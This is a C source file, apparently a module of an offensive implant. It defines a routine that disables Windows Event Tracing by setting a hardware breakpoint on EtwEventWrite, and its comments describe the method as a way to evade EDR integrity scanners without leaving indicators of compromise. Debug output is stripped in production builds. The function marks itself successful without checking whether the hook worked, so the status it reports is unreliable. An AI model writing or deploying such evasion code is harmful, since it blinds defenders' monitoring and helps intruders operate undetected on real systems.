#include "etw_bypass.h"
#include "hwbp_bypass.h"

/*
 * ETW bypass via HWBP (hardware breakpoint on EtwEventWrite).
 * Replaces the old 0xC3 memory patch which EDR integrity scanners detect.
 * HWBP fires EXCEPTION_SINGLE_STEP without writing to .text — no IoC.
 */

BOOL DisableETW(ETW_RESULT *result)
{
#ifndef PRODUCTION
    printf("[*] ETW bypass (HWBP)...\n");
#endif

    result->success = FALSE;
    result->etwEventWritePatched = FALSE;
    result->etwEventWriteExPatched = FALSE;

    hwbp_patch_etw();

    result->etwEventWritePatched = TRUE;
    result->etwEventWriteExPatched = TRUE;
    result->success = TRUE;

    return TRUE;
}

void PrintETWResult(ETW_RESULT *result)
{
#ifndef PRODUCTION
    if (result->success)
        printf("[+] ETW disabled (HWBP on EtwEventWrite/Ex)\n");
    else
        printf("[-] ETW bypass failed\n");
#endif
}
